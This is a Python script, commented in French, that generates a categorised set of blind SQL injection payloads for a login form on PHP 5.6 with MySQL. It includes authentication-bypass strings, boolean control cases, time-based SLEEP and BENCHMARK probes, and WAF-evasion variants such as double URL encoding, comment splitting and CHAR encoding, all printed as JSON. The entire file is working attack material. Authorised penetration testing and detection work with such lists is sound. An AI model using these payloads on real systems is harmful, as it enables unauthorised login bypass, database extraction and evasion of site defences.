# Générateur de payloads SQL Blind complet
# Format structuré pour test de formulaire d'authentification

payloads = {
    "boolean_true": [],
    "boolean_false": [],  
    "time_based": [],
    "obfuscated": [],
    "metadata": {}
}

# Catégorie 1: BOOLEAN TRUE (Auth Bypass)
true_payloads = [
    # Syntaxes OR basiques
    ("' OR 1=1-- ", "OR 1=1 avec espace"),
    ("' OR 1=1#", "OR 1=1 avec #"),  
    ("' OR 1=1/*", "OR 1=1 avec /* */"),
    ('" OR 1=1-- ', 'Double quotes OR 1=1'),
    ("` OR 1=1-- ", "Backticks OR 1=1"),
    (") OR 1=1-- ", "Parenthèse OR 1=1"),
    ("') OR 1=1-- ", "Quote+parenthèse OR 1=1"),
    
    # Sans espaces
    ("'OR'1'='1", "Collé: 'OR'1'='1"),
    ("'OR1=1--", "Collé: 'OR1=1--"),
    ('"OR"1"="1', 'Collé double quotes'),
    
    # AND 1=1
    ("' AND 1=1-- ", "AND 1=1 validation"),
    ("' AND TRUE-- ", "AND TRUE"),
    
    # TRUE direct
    ("' OR TRUE-- ", "OR TRUE direct"),
    
    # SUBSTR/LENGTH
    ("' OR SUBSTR(version(),1,1)='5'-- ", "SUBSTR version"),
    ("' OR LENGTH(database())>0-- ", "LENGTH database"),
    
    # LIKE
    ("' OR username LIKE '%'-- ", "LIKE joker"),
    
    # UNION SELECT
    ("' UNION SELECT 1,2,3-- ", "UNION numeric"),
    ("' UNION SELECT NULL,NULL-- ", "UNION NULL"),
    
    # IN/BETWEEN
    ("' OR 1 IN (1)-- ", "IN (1)"),
    ("' OR 1 BETWEEN 0 AND 2-- ", "BETWEEN"),
    
    # MySQL functions
    ("' OR @@version>0-- ", "@@version>0"),
    ("' OR VERSION()>0-- ", "VERSION()>0"),
    ("' OR CASE WHEN 1=1 THEN 1 END-- ", "CASE WHEN"),
    ("' OR COALESCE(1,0)=1-- ", "COALESCE"),
    
    # Encoded
    ("'%20OR%201=1-- ", "URL encode %20"),
    ("'%09OR%091=1%23", "Tab encode %09"),
    
    # RLIKE/REGEXP
    ("' OR 1 RLIKE 1-- ", "RLIKE 1"),
    
    # Terminators
    ("' OR 1=1;%00", "Terminator ;%00"),
]

# Catégorie 2: BOOLEAN FALSE (Controle)
false_payloads = [
    ("' OR 1=0-- ", "OR 1=0 basique"),
    ("' OR 1=0#", "OR 1=0 avec #"),  
    ("' AND 1=0-- ", "AND 1=0"),
    ("' OR FALSE-- ", "OR FALSE"),
    ("' OR '1'='2'-- ", "String mismatch"),
    ('" OR "1"="2"', 'Double quotes mismatch'),
    ("' OR NOT 1=1-- ", "NOT 1=1"),
    ("' OR SUBSTR(version(),1,1)='9'-- ", "SUBSTR faux"),
    ("' OR LENGTH(database())<0-- ", "LENGTH<0 impossible"),
]

# Catégorie 3: TIME-BASED (MySQL)
time_payloads = [
    ("' OR SLEEP(5)-- ", "SLEEP(5) simple"),
    ("' OR IF(1=1, SLEEP(5), 0)-- ", "IF SLEEP conditional"),
    ("'; SELECT SLEEP(5)-- ", "Separated SLEEP"),
    ("' OR IF(LENGTH(database())>0, SLEEP(5), 0)-- ", "IF LENGTH>0"),
    ("' OR BENCHMARK(5000000,MD5('test'))-- ", "BENCHMARK MD5"),
    ("' OR IF(ASCII(SUBSTR(database(),1,1))>64, SLEEP(5), 0)-- ", "IF ASCII>64"),
]

# Catégorie 4: OBFUSCATION (WAF Bypass)
obf_payloads = [
    ("%27%20OR%201%3D1--%20", "URL encode complet"),
    ("%2527%2520OR%25201%253D1%2523", "Double URL encode"),
    ("' OR/**/1=1-- ", "/**/ comment"),
    ("' /*!OR*/ 1=1-- ", "/*! MySQL comment */"),
    ("' O/**/R 1=1-- ", "O/**/R split"),
    ("' selselectect version()-- ", "selselectect"),
    ("' OR CHAR(79,82,32,49,61,49)-- ", "CHAR encoding"),
    ("' Or 1=1-- ", "Case Or"),
]

# Construction de la structure finale
for p, desc in true_payloads:
    payloads["boolean_true"].append({"payload": p, "description": desc, "technique": "boolean_true", "detection": "Auth réussie, contenu différent, pas d'erreur"})

for p, desc in false_payloads:
    payloads["boolean_false"].append({"payload": p, "description": desc, "technique": "boolean_false", "detection": "Auth échouée, message d'erreur attendu"})

for p, desc in time_payloads:
    payloads["time_based"].append({"payload": p, "description": desc, "technique": "time_based", "detection": "Délai réponse >5s différentiel"})

for p, desc in obf_payloads:
    payloads["obfuscated"].append({"payload": p, "description": desc, "technique": "obfuscated", "detection": "WAF/IPS bypass"})

# Ajout quotes styles
for q in ["'", '"', "`", ""]:
    payloads["boolean_true"].append({"payload": f"{q} OR 1=1-- ", "description": f"Quote style {repr(q)}", "technique": "quote_variation", "detection": "Test délimiteurs"})

# Ajout terminators
for t in ["-- ", "#", "/*", ";%00", "--\n", ";%23"]:
    payloads["boolean_true"].append({"payload": f"' OR 1=1{t}", "description": f"Terminator {repr(t)}", "technique": "terminator", "detection": "Test terminators"})

# Métadonnées
counts = {
    "boolean_true": len(payloads["boolean_true"]),
    "boolean_false": len(payloads["boolean_false"]),
    "time_based": len(payloads["time_based"]),
    "obfuscated": len(payloads["obfuscated"])
}
payloads["metadata"] = {
    "total_payloads": sum(counts.values()),
    "categories": counts,
    "target_environment": "PHP 5.6 / MySQL",
    "bypass_techniques": ["url_encoding", "double_encoding", "comment_bypass", "keyword_splitting", "case_variation", "char_encoding"]
}

# Affichage
import json
print(json.dumps(payloads, indent=2, ensure_ascii=False))

# Stats
print(f"\n{'='*70}")
print(f"TOTAL: {payloads['metadata']['total_payloads']} payloads")
print(f"TRUE: {counts['boolean_true']} | FALSE: {counts['boolean_false']}")
print(f"TIME: {counts['time_based']} | OBFUSCATED: {counts['obfuscated']}")
print(f"{'='*70}")

